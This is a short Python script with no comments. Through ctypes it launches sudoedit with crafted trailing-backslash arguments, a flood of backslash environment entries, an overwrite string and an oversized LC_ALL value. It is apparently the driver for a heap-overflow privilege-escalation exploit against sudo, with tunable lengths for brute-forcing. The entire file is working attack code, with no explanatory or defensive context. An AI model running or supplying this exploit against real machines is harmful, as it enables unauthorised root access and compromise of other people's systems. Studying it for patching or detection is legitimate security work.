import sys
import os
from ctypes import cdll, c_char_p, POINTER
libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
smash_len_a    = int(sys.argv[1])
smash_len_b    = int(sys.argv[2])
null_stomp_len = int(sys.argv[3])
lc_all_len     = int(sys.argv[4])
so_overwrite   = sys.argv[5]
working_dir    = sys.argv[6]
argv = [b'sudoedit', b'-s', b'#' * smash_len_a + b'\\', b'\\', b'#' * smash_len_b + b'\\', None]
cmd = b'/usr/bin/sudoedit'
env = [b'\\'] * null_stomp_len
env.append(so_overwrite.encode('latin-1'))
env.append(b'LC_ALL=C.UTF-8@' + (b'C' * lc_all_len))
env.append(None)
cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)
os.chdir(working_dir)
libc.execve(cmd, cargv, cenvp)